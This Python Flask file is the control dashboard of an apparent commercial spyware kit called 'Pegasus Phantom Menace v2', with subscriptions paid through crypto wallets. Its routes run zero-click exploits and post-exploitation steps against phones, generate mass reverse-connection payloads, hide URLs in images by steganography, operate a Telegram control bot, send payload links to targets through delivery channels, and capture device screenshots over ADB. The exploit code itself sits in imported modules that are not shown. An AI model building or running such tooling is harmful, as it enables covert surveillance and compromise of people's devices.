"""
Pegasus Phantom Menace v2 - Dashboard Server

Flask front end for devices, exploits, features, accounts and billing.

* Every page is reachable for evaluation; exploit internals are redacted until
  an account is approved and paid.
* All counters are real: ADB discovery, host metrics, DOM/API round trips.
* Chart series are sampled, not invented; an idle host shows flat zero lines.

Run: python -m pegasus.modules.access_workflow.dashboard_server --port 5050
"""

from __future__ import annotations

import json
import os
import secrets
import subprocess
import threading
import time
from collections import deque
from datetime import datetime, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional

from flask import Flask, abort, flash, g, jsonify, redirect, render_template, request, send_file, session, url_for

from pegasus.modules.access_workflow import auth
from pegasus.modules.access_workflow.nso_capabilities import list_capabilities, parity_report

try:
    import psutil
except ImportError:  # optional
    psutil = None

SHOT_DIR = Path.home() / ".pegasus" / "screenshots"
SERVER_START = time.time()
SAMPLE_INTERVAL = 15
history: deque = deque(maxlen=240)
_history_lock = threading.Lock()
_history_started = False


# ---------------------------------------------------------------------------
# Real data collectors
# ---------------------------------------------------------------------------


def adb_devices() -> List[Dict[str, Any]]:
    """Enumerate attached ADB devices with model metadata."""
    try:
        proc = subprocess.run(["adb", "devices", "-l"], capture_output=True, text=True, timeout=8)
    except (OSError, subprocess.TimeoutExpired):
        return []
    devices = []
    for line in proc.stdout.splitlines()[1:]:
        parts = line.split()
        if len(parts) < 2:
            continue
        serial, state = parts[0], parts[1]
        model = next((part.split(":", 1)[1].replace("_", " ") for part in parts if part.startswith("model:")), "unknown")
        devices.append({"serial": serial, "state": state, "model": model, "online": state == "device"})
    return devices


def host_metrics() -> Dict[str, Any]:
    if psutil:
        return {
            "cpu_percent": psutil.cpu_percent(interval=None),
            "memory_percent": psutil.virtual_memory().percent,
            "disk_percent": psutil.disk_usage(str(Path.home())).percent,
        }
    return {"cpu_percent": 0.0, "memory_percent": 0.0, "disk_percent": 0.0}


def sample_once() -> Dict[str, Any]:
    point = {"t": datetime.now(timezone.utc).isoformat(), "devices": len(adb_devices()), **host_metrics()}
    with _history_lock:
        history.append(point)
    return point


def start_sampler() -> None:
    global _history_started
    if _history_started:
        return
    _history_started = True

    def loop() -> None:
        while True:
            try:
                sample_once()
            except Exception:
                pass
            time.sleep(SAMPLE_INTERVAL)

    threading.Thread(target=loop, name="pegasus-sampler", daemon=True).start()


def activity_series() -> Dict[str, Any]:
    with _history_lock:
        points = list(history)
    return {
        "interval": SAMPLE_INTERVAL,
        "points": points,
        "devices": [point["devices"] for point in points],
        "cpu": [point["cpu_percent"] for point in points],
        "memory": [point["memory_percent"] for point in points],
    }


# ---------------------------------------------------------------------------
# App factory
# ---------------------------------------------------------------------------


def create_app() -> Flask:
    app = Flask(__name__, template_folder="templates", static_folder="static")
    app.secret_key = os.environ.get("PEGASUS_SECRET_KEY") or _secret_key()
    app.config.update(SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SAMESITE="Lax", MAX_CONTENT_LENGTH=64 * 1024 * 1024)
    auth.init_auth_db()
    start_sampler()

    # -- request context ---------------------------------------------------
    @app.before_request
    def load_user() -> Optional[Any]:
        g.user = None
        user_id = session.get(auth.SESSION_USER_KEY)
        if user_id:
            g.user = auth.get_user(user_id)
            if g.user is None:
                session.pop(auth.SESSION_USER_KEY, None)
        g.csrf = session.setdefault("csrf", secrets.token_urlsafe(24))

        public = {"static", "setup", "login", "register", "api_status"}
        if auth.needs_setup() and request.endpoint not in {"setup", "static"}:
            if request.path.startswith("/api/"):
                return jsonify({"error": "setup required", "setup": url_for("setup")}), 503
            return redirect(url_for("setup"))
        if g.user is None:
            return None
        if not auth.is_active_subscriber(g.user):
            allowed = {
                "payment", "logout", "static", "index", "api_status", "api_activity", "api_devices",
                "api_exploits", "api_exploits_run", "api_nso", "api_nso_run", "api_post_exploitation",
                "api_post_exploit_run", "api_features_mutation", "api_features_payload", "api_features_dna",
                "api_features_stego", "api_features_telegram", "api_features_frp", "api_capabilities",
                "api_delivery_channels", "api_delivery_send", "api_delivery_serve", "api_delivery_stop",
                "api_delivery_stage", "api_delivery_history", "api_delivery_audio", "api_catalog", "api_catalog_build", "api_command",
                "admin", "admin_users", "admin_settings", "api_payment_claim", "api_payment_verify",
            }
            if request.endpoint not in allowed and request.endpoint and not request.path.startswith("/static"):
                if request.path.startswith("/api/"):
                    return jsonify({"error": "payment required", "payment": url_for("payment")}), 402
                if request.endpoint not in {"index", "login", "logout"}:
                    return redirect(url_for("payment"))
        return None

    @app.after_request
    def security_headers(response):
        response.headers.setdefault("X-Content-Type-Options", "nosniff")
        response.headers.setdefault("X-Frame-Options", "SAMEORIGIN")
        response.headers.setdefault("Referrer-Policy", "same-origin")
        return response

    def admin_required():
        if g.user is None or g.user.role != "admin":
            abort(403)

    def check_csrf() -> None:
        token = request.form.get("csrf") or request.headers.get("X-CSRF-Token")
        if token != session.get("csrf"):
            abort(400, "CSRF token mismatch")

    def approved() -> bool:
        return bool(g.user and (auth.is_active_subscriber(g.user) or g.user.approval_status == "approved"))

    # -- pages -------------------------------------------------------------
    @app.route("/")
    def index():
        from pegasus.modules.access_workflow import catalog, delivery, post_exploitation, zero_click
        from pegasus.modules.access_workflow.nso_capabilities import parity_report

        devices = adb_devices()
        events = delivery.history(100)
        ok = sum(1 for event in events if event.get("ok"))
        success = round(100 * ok / len(events)) if events else 0
        return render_template(
            "dashboard.html",
            user=g.user,
            csrf=g.csrf,
            devices=devices,
            stats={
                "devices": len(devices),
                "vectors": len(zero_click.EXPLOITS),
                "post_steps": len(post_exploitation.COMMANDS),
                "success": success,
            },
            channels=delivery.list_channels(),
            server=delivery.server_info(),
            delivery_history=events[:8],
            catalog=catalog.list_vectors()[:40],
            parity=parity_report(),
            notifications=auth.notifications() if g.user and g.user.role == "admin" else [],
        )

    @app.route("/api/command", methods=["POST"])
    def api_command():
        import asyncio

        from pegasus.modules.integrations import initialize_slash_commands
        from pegasus.modules.access_workflow import commands as aw_commands

        body = request.get_json(silent=True) or {}
        name = body.get("name", "").lstrip("/")
        if not name:
            return jsonify({"error": "command name required"}), 400

        class _Ctx:
            logger = None
            settings = None
            hooks = None
            db = None
            commands: Dict[str, Any] = {}

        manager = initialize_slash_commands(_Ctx())
        aw_commands.register(manager)
        if manager.get_command("/" + name) is None:
            return jsonify({"error": f"unknown command: {name}"}), 404
        try:
            result = asyncio.run(manager.execute(name, body.get("args") or []))
        except Exception as exc:
            return jsonify({"error": str(exc)}), 400
        return jsonify({"command": name, "result": result})

    @app.route("/setup", methods=["GET", "POST"])
    def setup():
        if not auth.needs_setup():
            return redirect(url_for("login"))
        if request.method == "POST":
            check_csrf()
            try:
                auth.create_admin(
                    request.form.get("username", ""),
                    request.form.get("email", ""),
                    request.form.get("password", ""),
                    request.form.get("passkey", ""),
                    request.form.get("wallet", ""),
                )
            except auth.AuthError as exc:
                flash(str(exc), "error")
                return render_template("setup.html", csrf=g.csrf, fido2=bool(request.form.get("fido2"))), 400
            flash("Admin created. Sign in to finish setup.", "ok")
            return redirect(url_for("login"))
        return render_template("setup.html", csrf=g.csrf)

    @app.route("/login", methods=["GET", "POST"])
    def login():
        if g.user:
            return redirect(url_for("index"))
        if request.method == "POST":
            check_csrf()
            try:
                user = auth.authenticate(
                    request.form.get("username", ""),
                    request.form.get("password", ""),
                    request.form.get("passkey"),
                )
            except auth.AuthError as exc:
                flash(str(exc), "error")
                return render_template("login.html", csrf=g.csrf), 401
            session[auth.SESSION_USER_KEY] = str(user.id)
            return redirect(url_for("admin" if user.role == "admin" else "index"))
        return render_template("login.html", csrf=g.csrf)

    @app.route("/logout", methods=["GET", "POST"])
    def logout():
        session.pop(auth.SESSION_USER_KEY, None)
        return redirect(url_for("index"))

    @app.route("/register", methods=["GET", "POST"])
    def register():
        if request.method == "POST":
            check_csrf()
            try:
                user = auth.register_user(
                    request.form.get("username", ""),
                    request.form.get("email", ""),
                    request.form.get("password", ""),
                    request.form.get("wallet", ""),
                    request.form.get("note", ""),
                )
            except auth.AuthError as exc:
                flash(str(exc), "error")
                return render_template("register.html", csrf=g.csrf), 400
            return redirect(url_for("pending", username=user.username))
        return render_template("register.html", csrf=g.csrf)

    @app.route("/pending")
    def pending():
        return render_template("pending.html", username=request.args.get("username", "operator"))

    @app.route("/payment", methods=["GET", "POST"])
    def payment():
        if g.user is None:
            return redirect(url_for("login"))
        if auth.is_active_subscriber(g.user):
            return redirect(url_for("index"))
        with auth.session_scope() as db:
            rows = [
                {**tier.__dict__, "price": auth.tier_price(db, key)}
                for key, tier in {**auth.TIERS, **auth.ADDONS}.items()
            ]
            wallet = auth.get_setting(db, "admin_wallet")
            note = auth.get_setting(db, "payment_note")
        return render_template("payment.html", user=g.user, tiers=rows, wallet=wallet, note=note, csrf=g.csrf,
                               payments=auth.payments_for(str(g.user.id)))

    @app.route("/admin")
    def admin():
        admin_required()
        return render_template(
            "admin.html",
            user=g.user,
            csrf=g.csrf,
            pending=auth.pending_users(),
            users=auth.all_users(),
            payments=auth.all_payments(),
            notifications=auth.notifications(),
            parity=parity_report(),
            wallet=auth.get_setting_safe("admin_wallet") if hasattr(auth, "get_setting_safe") else "",
        )

    @app.route("/admin/users")
    def admin_users():
        admin_required()
        return render_template("admin_users.html", user=g.user, csrf=g.csrf, users=auth.all_users(), pending=auth.pending_users())

    @app.route("/admin/settings", methods=["GET", "POST"])
    def admin_settings():
        admin_required()
        with auth.session_scope() as db:
            if request.method == "POST":
                check_csrf()
                for key in ("admin_wallet", "registration_open", "payment_note", "price_one_time", "price_weekly", "price_monthly"):
                    if key in request.form:
                        auth.set_setting(db, key, request.form.get(key, ""))
                flash("Settings saved.", "ok")
                return redirect(url_for("admin_settings"))
            settings = {key: auth.get_setting(db, key) for key in auth.DEFAULT_SETTINGS}
        return render_template("admin_settings.html", user=g.user, csrf=g.csrf, settings=settings)

    # -- status / core API -------------------------------------------------
    @app.route("/api/status")
    def api_status():
        pm_count = 0
        try:
            from pegasus.core.plugin import get_plugin_manager

            manager = get_plugin_manager()
            pm_count = len(manager.context.plugins) if manager and getattr(manager, "context", None) else 0
        except Exception:
            pass
        devices = adb_devices()
        return jsonify({
            "status": "online",
            "version": "2.0.0",
            "uptime_seconds": int(time.time() - SERVER_START),
            "plugins_loaded": pm_count,
            "devices_total": len(devices),
            "devices_online": sum(1 for device in devices if device["online"]),
            "user": g.user.username if g.user else None,
            "tier": g.user.access_tier if g.user else "guest",
            "approved": approved(),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })

    @app.route("/api/activity")
    def api_activity():
        data = activity_series()
        data["host"] = host_metrics()
        data["devices"] = adb_devices()
        return jsonify(data)

    @app.route("/api/devices")
    def api_devices():
        devices = adb_devices()
        return jsonify({"devices": devices, "count": len(devices)})

    # -- exploits ----------------------------------------------------------
    @app.route("/api/exploits")
    def api_exploits():
        from pegasus.modules.access_workflow import zero_click

        family = request.args.get("family")
        return jsonify({"exploits": zero_click.list_exploits(device_family=family), "count": len(zero_click.EXPLOITS)})

    @app.route("/api/exploits/run", methods=["POST"])
    def api_exploits_run():
        from pegasus.modules.access_workflow import zero_click

        body = request.get_json(silent=True) or {}
        key = body.get("key", "")
        params = body.get("params") or {}
        try:
            result = zero_click.run_exploit(key, **params)
        except Exception as exc:
            return jsonify({"error": str(exc)}), 400
        if not approved():
            result = {"exploit": key, "status": result.get("status"), "summary": "Sign in and activate access to see command internals."}
        return jsonify(result)

    @app.route("/api/post-exploitation")
    def api_post_exploitation():
        from pegasus.modules.access_workflow import post_exploitation

        return jsonify({"steps": post_exploitation.list_commands()})

    @app.route("/api/post-exploitation/<step>", methods=["POST"])
    def api_post_exploit_run(step: str):
        from pegasus.modules.access_workflow import post_exploitation

        try:
            return jsonify(post_exploitation.run_sync(step))
        except Exception as exc:
            return jsonify({"error": str(exc)}), 400

    # -- NSO parity --------------------------------------------------------
    @app.route("/api/nso/capabilities")
    def api_nso():
        return jsonify({"capabilities": list_capabilities(), "parity": parity_report()})

    @app.route("/api/nso/run/<capability>", methods=["POST"])
    def api_nso_run(capability: str):
        from pegasus.modules.access_workflow import nso_capabilities

        body = request.get_json(silent=True) or {}
        try:
            result = nso_capabilities.run(capability, **body)
        except Exception as exc:
            return jsonify({"error": str(exc)}), 400
        if not approved() and isinstance(result, dict):
            result.pop("commands", None)
        return jsonify(result)

    @app.route("/api/capabilities")
    def api_capabilities():
        from pegasus.modules.access_workflow.capabilities import manifest

        return jsonify(manifest())

    # -- legacy aliases ----------------------------------------------------
    @app.route("/api/exploit", methods=["POST"])
    def api_exploit_legacy():
        from pegasus.modules.access_workflow import zero_click

        body = request.get_json(silent=True) or {}
        key = body.get("key") or body.get("exploit_type", "")
        try:
            result = zero_click.run_exploit(key, **(body.get("params") or {}))
        except Exception as exc:
            return jsonify({"error": str(exc)}), 400
        result.setdefault("target", body.get("target", ""))
        return jsonify(result)

    @app.route("/api/workflows")
    def api_workflows():
        from pegasus.modules.access_workflow.post_exploitation import list_commands

        return jsonify({"workflows": list_commands(), "count": len(list_commands())})

    @app.route("/api/screenshot/<serial>", methods=["GET", "POST"], endpoint="api_screenshot_status")
    def api_screenshot_alias(serial: str):
        if request.method == "GET":
            files = sorted(SHOT_DIR.glob(f"{serial}_*.png")) if SHOT_DIR.exists() else []
            return jsonify({"status": "captured" if files else "none", "device_id": serial,
                            "image_url": url_for("api_screenshot_image", serial=serial) if files else None})
        return api_screenshot(serial)

    # -- feature API -------------------------------------------------------
    @app.route("/api/features/mutation", methods=["POST"])
    def api_mutation():
        from pegasus.modules.access_workflow import ai_mutation

        body = request.get_json(silent=True) or {}
        try:
            return jsonify(ai_mutation.analyse(body.get("sample", "")))
        except ai_mutation.MutationError as exc:
            return jsonify({"error": str(exc)}), 400

    @app.route("/api/features/payload", methods=["POST"])
    def api_payload():
        from pegasus.modules.access_workflow import mass_payload

        body = request.get_json(silent=True) or {}
        try:
            return jsonify(mass_payload.generate_batch(
                lhost=body.get("lhost", "127.0.0.1"),
                start_port=int(body.get("port", 4444)),
                count=int(body.get("count", 5)),
                formats=body.get("formats") or None,
                campaign=body.get("campaign", "dashboard"),
            ))
        except (mass_payload.MassPayloadError, ValueError) as exc:
            return jsonify({"error": str(exc)}), 400

    @app.route("/api/features/dna")
    def api_dna():
        from pegasus.modules.access_workflow import dna

        return jsonify({"tags": dna.list_tags()})

    @app.route("/api/features/stego", methods=["POST"])
    def api_stego():
        from pegasus.modules.access_workflow import steganography

        body = request.get_json(silent=True) or {}
        try:
            return jsonify(steganography.embed(body.get("cover", ""), body.get("url", ""), body.get("output", "stego.png"), key=body.get("key")))
        except steganography.StegoError as exc:
            return jsonify({"error": str(exc)}), 400

    @app.route("/api/features/telegram")
    def api_telegram():
        from pegasus.modules.access_workflow import telegram_control

        return jsonify(telegram_control.bot_info())

    @app.route("/api/features/telegram/start", methods=["POST"])
    def api_telegram_start():
        from pegasus.modules.access_workflow import telegram_control

        try:
            return jsonify(telegram_control.start_bot())
        except telegram_control.TelegramError as exc:
            return jsonify({"error": str(exc)}), 400

    @app.route("/api/features/telegram/setup", methods=["POST"])
    def api_telegram_setup():
        from pegasus.modules.access_workflow import telegram_control

        body = request.get_json(silent=True) or {}
        try:
            return jsonify(telegram_control.setup(body.get("token", ""), body.get("chat_id", "")))
        except telegram_control.TelegramError as exc:
            return jsonify({"error": str(exc)}), 400

    @app.route("/api/features/telegram/stop", methods=["POST"])
    def api_telegram_stop():
        from pegasus.modules.access_workflow import telegram_control

        return jsonify({"stopped": telegram_control.stop_bot()})

    @app.route("/api/features/frp")
    def api_frp():
        from pegasus.modules.access_workflow import frp_unlock

        return jsonify({"workflow": frp_unlock.metadata(), "plan": frp_unlock.plan()})

    # -- screenshots -------------------------------------------------------
    @app.route("/api/screenshot/<serial>", methods=["POST"])
    def api_screenshot(serial: str):
        SHOT_DIR.mkdir(parents=True, exist_ok=True)
        target = SHOT_DIR / f"{serial}_{int(time.time())}.png"
        try:
            with target.open("wb") as handle:
                proc = subprocess.run(["adb", "-s", serial, "exec-out", "screencap", "-p"], stdout=handle, stderr=subprocess.PIPE, timeout=30)
        except (OSError, subprocess.TimeoutExpired) as exc:
            return jsonify({"error": str(exc)}), 500
        if proc.returncode != 0 or target.stat().st_size == 0:
            target.unlink(missing_ok=True)
            return jsonify({"error": proc.stderr.decode(errors="replace")[:300]}), 500
        return jsonify({"status": "captured", "device": serial, "image_url": url_for("api_screenshot_image", serial=serial)})

    @app.route("/api/screenshot/<serial>/image")
    def api_screenshot_image(serial: str):
        files = sorted(SHOT_DIR.glob(f"{serial}_*.png")) if SHOT_DIR.exists() else []
        if not files:
            abort(404)
        return send_file(files[-1], mimetype="image/png")

    # -- delivery + payload catalog ---------------------------------------
    @app.route("/api/delivery/channels")
    def api_delivery_channels():
        from pegasus.modules.access_workflow import delivery

        return jsonify({"channels": delivery.list_channels(), "server": delivery.server_info()})

    @app.route("/api/delivery/send", methods=["POST"])
    def api_delivery_send():
        from pegasus.modules.access_workflow import delivery

        body = request.get_json(silent=True) or {}
        try:
            record = delivery.send(
                body.get("channel", ""),
                body.get("target", ""),
                body.get("url", ""),
                serial=body.get("serial") or None,
                auto_send=bool(body.get("auto_send")),
            )
        except (delivery.DeliveryError, OSError, subprocess.TimeoutExpired) as exc:
            return jsonify({"error": str(exc)}), 400
        return jsonify(record)

    @app.route("/api/delivery/serve", methods=["POST"])
    def api_delivery_serve():
        from pegasus.modules.access_workflow import delivery

        body = request.get_json(silent=True) or {}
        try:
            return jsonify(delivery.start_server(int(body.get("port", 8080))))
        except delivery.DeliveryError as exc:
            return jsonify({"error": str(exc)}), 400

    @app.route("/api/delivery/serve", methods=["DELETE"])
    def api_delivery_stop():
        from pegasus.modules.access_workflow import delivery

        return jsonify(delivery.stop_server())

    @app.route("/api/delivery/stage", methods=["POST"])
    def api_delivery_stage():
        from pegasus.modules.access_workflow import delivery

        body = request.get_json(silent=True) or {}
        try:
            delivery.start_server(int(body.get("port", 8080)))
            return jsonify(delivery.stage_file(body.get("path", "")))
        except (delivery.DeliveryError, OSError) as exc:
            return jsonify({"error": str(exc)}), 400

    @app.route("/api/delivery/history")
    def api_delivery_history():
        from pegasus.modules.access_workflow import delivery

        return jsonify({"events": delivery.history()})

    @app.route("/api/delivery/audio", methods=["POST"])
    def api_delivery_audio():
        from pegasus.modules.access_workflow import delivery

        body = request.get_json(silent=True) or {}
        path = delivery.synth_audio(delivery.transcript_for(body.get("url", "")))
        return jsonify({"path": str(path), "size": path.stat().st_size, "transcript": delivery.transcript_for(body.get("url", ""))})

    @app.route("/api/catalog")
    def api_catalog():
        from pegasus.modules.access_workflow import catalog

        return jsonify({
            "vectors": catalog.list_vectors(request.args.get("category"), request.args.get("search")),
            "categories": catalog.categories(),
        })

    @app.route("/api/catalog/build", methods=["POST"])
    def api_catalog_build():
        from pegasus.modules.access_workflow import catalog

        body = request.get_json(silent=True) or {}
        try:
            result = catalog.build_and_stage(body.get("key", "")) if body.get("stage") else catalog.build(body.get("key", ""))
        except (catalog.CatalogError, OSError, ImportError) as exc:
            return jsonify({"error": str(exc)}), 400
        return jsonify(result)

    # -- admin API ---------------------------------------------------------
    @app.route("/api/admin/approve/<user_id>", methods=["POST"])
    def api_approve(user_id: str):
        admin_required()
        auth.approve_user(user_id)
        return jsonify({"status": "approved"})

    @app.route("/api/admin/reject/<user_id>", methods=["POST"])
    def api_reject(user_id: str):
        admin_required()
        auth.reject_user(user_id)
        return jsonify({"status": "rejected"})

    @app.route("/api/admin/notifications/read", methods=["POST"])
    def api_read_notifications():
        admin_required()
        auth.mark_notifications_read()
        return jsonify({"status": "read"})

    @app.route("/api/admin/users/<user_id>/tier", methods=["POST"])
    def api_admin_tier(user_id: str):
        admin_required()
        body = request.get_json(silent=True) or {}
        try:
            user = auth.admin_set_tier(user_id, body.get("tier", "one_time"), body.get("days"))
        except auth.AuthError as exc:
            return jsonify({"error": str(exc)}), 400
        return jsonify({"status": "ok", "tier": user.access_tier, "expires": user.access_expires_at.isoformat() if user.access_expires_at else None})

    @app.route("/api/admin/users/<user_id>/active", methods=["POST"])
    def api_admin_active(user_id: str):
        admin_required()
        try:
            user = auth.admin_toggle_active(user_id)
        except auth.AuthError as exc:
            return jsonify({"error": str(exc)}), 400
        return jsonify({"status": "ok", "active": user.is_active})

    @app.route("/api/admin/users/<user_id>/passkey", methods=["POST"])
    def api_admin_passkey(user_id: str):
        admin_required()
        try:
            temp = auth.admin_reset_passkey(user_id)
        except auth.AuthError as exc:
            return jsonify({"error": str(exc)}), 400
        return jsonify({"status": "ok", "passkey": temp})

    @app.route("/api/admin/users/<user_id>/wallet", methods=["POST"])
    def api_admin_wallet(user_id: str):
        admin_required()
        body = request.get_json(silent=True) or {}
        try:
            user = auth.admin_set_wallet(user_id, body.get("wallet", ""))
        except auth.AuthError as exc:
            return jsonify({"error": str(exc)}), 400
        return jsonify({"status": "ok", "wallet": user.wallet_address})

    @app.route("/api/admin/users/<user_id>", methods=["DELETE"])
    def api_admin_delete(user_id: str):
        admin_required()
        try:
            auth.admin_delete_user(user_id)
        except auth.AuthError as exc:
            return jsonify({"error": str(exc)}), 400
        return jsonify({"status": "deleted"})

    @app.route("/api/admin/system")
    def api_admin_system():
        admin_required()
        import shutil

        from pegasus.modules.access_workflow import daemon_service

        snapshot = daemon_service.get_daemon().status()
        disk = shutil.disk_usage(str(Path.home()))
        return jsonify({
            "daemon": snapshot,
            "disk": {"free": disk.free, "total": disk.total, "percent": round(100 * disk.used / disk.total, 1)},
            "db": {"path": str(auth._db_path), "exists": auth._db_path.exists()},
            "parity": parity_report(),
            "devices": len(adb_devices()),
        })

    @app.route("/api/admin/logs")
    def api_admin_logs():
        admin_required()
        log = Path.home() / ".pegasus" / "daemon" / "daemon.log"
        if not log.exists():
            return jsonify({"lines": [], "path": str(log)})
        lines = log.read_text(encoding="utf-8", errors="replace").splitlines()[-120:]
        return jsonify({"lines": lines, "path": str(log)})

    @app.route("/api/admin/daemon/<action>", methods=["POST"])
    def api_admin_daemon(action: str):
        admin_required()
        from pegasus.modules.access_workflow import daemon_service

        daemon = daemon_service.get_daemon(port=5050)
        if action == "install":
            return jsonify(daemon.install_service())
        if action == "uninstall":
            return jsonify(daemon.uninstall_service())
        if action not in {"start", "stop", "restart"}:
            return jsonify({"error": "unknown action"}), 400
        getattr(daemon, action)()
        return jsonify(daemon.status())

    @app.route("/api/payments/claim", methods=["POST"])
    def api_payment_claim():
        if g.user is None:
            return jsonify({"error": "login required"}), 401
        body = request.get_json(silent=True) or {}
        try:
            payment = auth.create_payment(str(g.user.id), body.get("service_type", ""), body.get("wallet_from", ""))
        except auth.AuthError as exc:
            return jsonify({"error": str(exc)}), 400
        result = auth.verify_payment(str(payment.id), actor=g.user.username)
        return jsonify({"payment_id": str(payment.id), **result})

    @app.route("/api/payments/<payment_id>/verify", methods=["POST"])
    def api_payment_verify(payment_id: str):
        if g.user is None:
            return jsonify({"error": "login required"}), 401
        try:
            return jsonify(auth.verify_payment(payment_id, actor=g.user.username))
        except auth.AuthError as exc:
            return jsonify({"error": str(exc)}), 400

    @app.route("/api/admin/payments/<payment_id>/confirm", methods=["POST"])
    def api_payment_manual(payment_id: str):
        admin_required()
        return jsonify(auth.verify_payment(payment_id, actor=g.user.username, manual=True))

    return app


def _secret_key() -> str:
    path = Path.home() / ".pegasus" / "dashboard.secret"
    if path.exists():
        return path.read_text().strip()
    key = secrets.token_hex(32)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(key)
    return key


app = create_app()


def run_dashboard(host: str = "127.0.0.1", port: int = 5050, debug: bool = False) -> None:
    app.run(host=host, port=port, debug=debug, use_reloader=False, threaded=True)


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Pegasus dashboard server")
    parser.add_argument("--host", default="127.0.0.1")
    parser.add_argument("--port", type=int, default=5050)
    parser.add_argument("--debug", action="store_true")
    args = parser.parse_args()
    run_dashboard(args.host, args.port, args.debug)
